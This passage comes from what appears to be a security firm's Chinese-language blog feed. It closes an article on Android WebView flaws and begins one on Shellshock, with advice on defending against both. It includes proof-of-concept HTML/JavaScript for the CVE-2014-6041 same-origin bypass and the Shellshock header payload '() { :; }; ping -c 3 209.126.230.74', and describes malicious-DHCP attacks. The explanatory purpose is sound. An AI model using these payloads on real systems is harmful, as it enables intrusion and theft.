&lt;p&gt;除了 “searchBoxJavaBridge_” 外，還有兩個介面會在特定情況下被加到 WebView 中。若使用者有在手機上 [系統設定] 裡的 [協助工具]，打開 [服務] 子分類中的任何一個項目，系統就會對其後建立的 WebView 自動加上 “accessibility” 和 “accessibilityTraversal”這兩個介面。這行為在 Android 4.4 由於&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;舊版 WebView 被取代&lt;/a&gt;而消失了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_accessibility_service.png&quot; alt=&quot;Android 協助工具服務&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;防範&quot;&gt;防範&lt;/h4&gt;

&lt;p&gt;作為開發者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 JavaScript 功能 (預設關閉)&lt;/li&gt;
  &lt;li&gt;可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料&lt;/li&gt;
  &lt;li&gt;在有風險的系統中停用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;在有風險的系統中使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; 移除系統自帶的介面&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作為使用者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 [不明的來源] 選項 (預設關閉)&lt;/li&gt;
  &lt;li&gt;使用 Android 4.2 或以上不受影響的系統&lt;/li&gt;
  &lt;li&gt;勿在受影響的系統上使用機敏服務或儲存機敏資料&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_unknown_source.png&quot; alt=&quot;Android 不明的來源&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-繞過同源策略-same-origin-policy-bypass&quot;&gt;2. 繞過同源策略 (Same-Origin Policy bypass)&lt;/h4&gt;

&lt;h5 id=&quot;風險個資被盜&quot;&gt;風險：個資被盜&lt;/h5&gt;
&lt;p&gt;為防止網頁在載入外部資源時引發安全問題，瀏覽器會實作&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript&quot;&gt;同源策略&lt;/a&gt;以限制程式碼和不同網域資源間的互動。&lt;/p&gt;

&lt;p&gt;其中 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041&quot;&gt;CVE-2014-6041&lt;/a&gt; 漏洞，通過程式在處理 \u0000 (unicode null byte) 時的失誤而繞過了原有的限制。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CVE-2014-6041 UXSS DEMO&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;target_frame&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://devco.re/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;go&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;window.open(&amp;#39;\u0000javascript:alert(document.domain)&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;target_frame&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如果上面的網頁是放置在與 &lt;a href=&quot;http://devco.re/&quot;&gt;http://devco.re/&lt;/a&gt; 不同源的地方，正常來說點擊按鈕後會因為 SOP 的關係，該段 JavaScript 無法執行而不會有反應。但在受影響的環境裡則能順利執行並跳出 “devco.re” 這個網域名稱。&lt;/p&gt;

&lt;p&gt;上述問題被發現後沒多久，再由相同研究員發現一個早在多年前已經被修正的 &lt;a href=&quot;http://trac.webkit.org/changeset/96826&quot;&gt;WebKit 臭蟲&lt;/a&gt;仍然出現在 Android 4.3 及之前的版本上。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.bing.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(document.domain)&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;foobar&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;上述的跨來源操作同樣違反了 SOP，應當被拒絕執行。但他卻能在有風險的 WebView 上被執行，造成風險。&lt;/p&gt;

&lt;h4 id=&quot;防範-1&quot;&gt;防範&lt;/h4&gt;

&lt;p&gt;作為開發者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 JavaScript 功能 (預設關閉)&lt;/li&gt;
  &lt;li&gt;可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作為使用者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 [不明的來源] 選項 (預設關閉)&lt;/li&gt;
  &lt;li&gt;使用 Android 4.4 或以上不受影響的系統&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;結語&quot;&gt;結語&lt;/h3&gt;

&lt;p&gt;談到這裡大家可能會有個疑問，如果應用程式中所載入的遠端網頁網址都是固定，受開發者控制的，應該就會安全沒有風險。還記得在 &lt;a href=&quot;http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/&quot;&gt;被忽略的 SSL 處理&lt;/a&gt; 裡提及過的中間人攻擊嗎？如果連線過程是採用明文的 HTTP ，或是加密的 HTTPS 但沒落實做好憑證檢查，內容就有機會被攻擊者竊取修改，再結合上面提到的漏洞，對使用者帶來的影響則大大增加。&lt;/p&gt;

&lt;p&gt;下面我們製作了一段結合中間人攻擊與 addJavascriptInterface 漏洞，模擬使用者手機被入侵的影片：&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/reKEu-Ajo50&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;從影片的最後可以看到，攻擊者取得存在漏洞的應用程式權限，並取得裡面的機敏資料。&lt;/p&gt;

&lt;p&gt;而在繞過同源策略問題上，無論是透過 null byte 或是設定屬性來達到，其實都是屬於存在已久的手法，多年前在別的平台、瀏覽器上就已經發生過，除了編寫上的疏忽外，缺乏一個完整的測試流程去做檢查相信也是其中一個原因。&lt;/p&gt;

&lt;p&gt;Android 的生態系統問題，使得大多數的使用者手機未能跟得上系統更新的步驟，讓他們即使知道自己所使用系統存在問題也愛莫能助。&lt;/p&gt;

&lt;p&gt;作為開發商，應需要在系統支援度與其相應存在的安全風險中取得平衡，來決定應用程式所支援的最低版本為何。最後作為一個負責任的開發者，應為已被公開的漏洞做好應對措施，避免使用者暴露在風險當中。&lt;/p&gt;

&lt;h3 id=&quot;參考&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;Abusing WebView JavaScript Bridges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html&quot;&gt;Android Browser Same Origin Policy Bypass &amp;lt; 4.4 - CVE-2014-6041&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html&quot;&gt;A Tale Of Another SOP Bypass In Android Browser &amp;lt; 4.4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/</link>
                <guid>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</guid>
                <pubDate>Mon, 13 Oct 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</title>
                <description>&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Shellshock 受影響的 Bash 版本如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bash 4.3 Patch 25 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 4.2 Patch 48 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 4.1 Patch 12 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 4.0 Patch 39 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 3.2 Patch 52 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 3.1 Patch 18 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 3.0 Patch 17 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 2.0.5b Patch 8 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 1.14.7 （含）以前版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這次的問題出在 bash 對環境變數的解析上。若有辦法在環境變數中塞入惡意的程式碼，並且順利將這些環境變數傳入 bash，bash 就會因解析錯誤而執行惡意指令、和讓攻擊者能直接對系統進行基本的操作。原始碼及更進階的原理請參考&lt;a href=&quot;http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html&quot;&gt;這篇&lt;/a&gt;。Shellshock 之所以嚴重，一來是因為攻擊語法相當簡單，只需要一行指令，就可以直接對系統進行操作；二來是因為 bash 使用範圍極廣，多款作業系統預設 shell 就是 bash。 常見的作業系統與其預設 shell 整理如下：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;作業系統&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;預設 shell&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RHEL&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;早期是 ash, 3.0 開始是 mksh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;sh (Lenny, 5.0)&lt;br /&gt;dash (Squeeze, 6.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;embedded device&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;大部分使用 busybox (ash)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcsh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;dash&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Jailbreak 後是 bash&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
我們看到近半數知名的 un*x 系統預設使用 bash，可以推想這次影響範圍有多廣，尤其是許多服務都架構在這之上，若遭受到攻擊，損失的可能是企業的機密資料或客戶資料。至於沒有預設使用 bash 的作業系統，也並不意味著完全沒有風險，例如 Ubuntu 在 DHCP 客戶端使用到 bash ，就仍然會有風險，下面文章中也會提到這樣的狀況。另外，早期新聞中常出現物聯網設備會受此漏洞影響的報導，經過我們實測，物聯網設備為求精簡，大多使用 busybox，而其 shell 為 ash，故大多數設備在這次 Shellshock 威脅中影響不大，不過儘管物聯網設備逃過了這次 Shellshock 事件，有許多設備仍然是&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;赤裸裸&lt;/a&gt;的。&lt;/p&gt;

&lt;h3 id=&quot;常見的-shellshock-利用方式&quot;&gt;常見的 Shellshock 利用方式&lt;/h3&gt;

&lt;p&gt;Shellshock 漏洞被公布後，惡意攻擊者無不想要透過這個漏洞對伺服器進行遠端攻擊，一些遠端攻擊概念也陸續被證實。最早的&lt;a href=&quot;http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html&quot;&gt;公開大量掃描&lt;/a&gt;是由 Errata Security 在其部落格公布技術細節，他們在 HTTP 請求表頭中的 Cookie、Host、Referer 中放置惡意語法 &lt;code class=&quot;highlighter-rouge&quot;&gt;() { :; }; ping -c 3 209.126.230.74&lt;/code&gt;，並且利用 masscan 對全世界 HTTP 伺服器 (port 80) 進行掃描。因為一般伺服器會將 HTTP 表頭中之內容放入環境變數中，若伺服器首頁入口程式本身是 bash shell script 或者其子程序有呼叫到 bash，就會受到惡意語法的影響，執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;ping -c 3 209.126.230.74&lt;/code&gt; 指令。&lt;/p&gt;

&lt;h4 id=&quot;攻擊使用-cgi-的網頁伺服器&quot;&gt;攻擊使用 CGI 的網頁伺服器&lt;/h4&gt;

&lt;p&gt;利用同樣的道理，惡意攻擊者開始在 HTTP 表頭中置入惡意的語法，大量去掃描網路上的 CGI 網頁，因為這種網頁常呼叫系統指令，所以成功機率都頗高，攻擊成功的結果如下圖，從這張圖也可了解這個弱點可以簡單地透過一個參數就能直接讓系統執行任意指令。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot; alt=&quot;攻擊使用 CGI 的網頁伺服器&quot; title=&quot;攻擊使用 CGI 的網頁伺服器&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;詳細的實作流程請參考下面影片：&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/RUsHcZi2hIU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;我們團隊也在 CGI 環境下執行幾種程式語言進行測試，發現用到以下 function 時會讀取到環境變數（date 只是範例，可代換為其他系統指令），因此若伺服器在 CGI 環境下使用這些 function，會為伺服器本身帶來嚴重風險。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Language&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(“date &amp;gt; /dev/null”);&lt;br /&gt;open(SHELLSHOCK, “| date &amp;gt; /dev/null”);&lt;br /&gt;system(“date &amp;gt; /dev/null;”);&lt;br /&gt;print `date &amp;gt; /dev/null`&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(‘date’);&lt;br /&gt;system(‘date’);&lt;br /&gt;mb_send_mail();&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Python&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;os.system(‘date’)&lt;br /&gt;subprocess.call(‘date’, shell=True)&lt;br /&gt;subprocess.Popen(‘date’, shell=True)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ruby&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;`date`&lt;br /&gt;exec ‘date’&lt;br /&gt;system ‘date’&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;建置惡意-dhcp-伺服器感染連線使用者&quot;&gt;建置惡意 DHCP 伺服器感染連線使用者&lt;/h4&gt;

&lt;p&gt;同時，有另一批人發現某些作業系統在進行 DHCP 連線時，會將 DHCP 伺服器傳入的一些資訊塞入到環境變數中。於是，若建置一個惡意 DHCP 伺服器，對其連線的使用者就有很高的機會遭受攻擊。我們實際做了實驗攻擊一般使用者，在使用者建立連線的當下放置後門，實驗過程如下影片：&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
我們也分別測試了在不同作業系統下是否會受到惡意 DHCP 伺服器影響，基本上，常見的 un*x 系統開機後自動連線基本上都會中招。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;OS&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Version&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;14.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4.4.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apple iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gentoo&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20140925&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (已修復)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;17 “Qiana” Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian 201403 Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2:1&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.9.5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;openSUSE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;13.2&lt;/td&gt;
